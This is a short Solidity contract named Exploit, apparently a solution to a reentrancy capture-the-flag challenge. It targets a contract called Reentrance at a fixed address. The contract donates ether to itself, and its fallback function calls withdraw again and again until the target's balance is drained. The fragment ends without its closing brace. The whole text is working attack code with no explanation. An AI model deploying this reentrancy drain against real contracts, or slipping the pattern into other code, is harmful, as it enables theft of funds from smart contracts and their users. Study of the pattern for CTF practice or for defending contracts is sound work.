contract Exploit {
    constructor () public payable{}
    address payable instance;
    
    Reentrance public target = Reentrance(0xA356b9639D931CCCd10908b9BD87a365B96d4174);
    uint256 public amount = 1 ether;
   
    function donateToSelf() public payable {
        target.donate.value(amount)(address(this));
    }
   
    fallback() external payable {
        if(address(target).balance !=0) {
        target.withdraw(amount);
        }
    }
